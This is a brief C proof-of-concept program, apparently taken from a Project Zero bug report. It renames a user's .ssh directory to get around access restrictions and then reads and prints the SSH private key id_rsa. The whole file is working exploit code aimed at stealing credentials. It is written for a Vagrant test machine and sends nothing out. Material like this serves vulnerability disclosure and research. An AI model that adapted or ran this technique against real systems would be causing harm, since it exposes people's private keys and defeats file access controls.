#define _GNU_SOURCE
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <err.h>

// Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1676

int main(int argc, char **argv) {
  errno = 0;
  int fd = open("/home/vagrant/.ssh/id_rsa", O_RDONLY);
  printf("open id_rsa direct: %d, error = %m\n", fd);

  if (rename("/home/vagrant/.ssh", "/home/vagrant/.sshx"))
    err(1, "rename");

  errno = 0;
  fd = open("/home/vagrant/.sshx/id_rsa", O_RDONLY);
  printf("open id_rsa indirect: %d, error = %m\n", fd);

  if (rename("/home/vagrant/.sshx", "/home/vagrant/.ssh"))
    err(1, "rename2");

  char buf[1001];
  errno = 0;
  int res = read(fd, buf, 1000);
  printf("read res: %d, error = %m\n", res);
  if (res > 0) {
    buf[res] = 0;
    puts(buf);
  }

  exit(0);
}
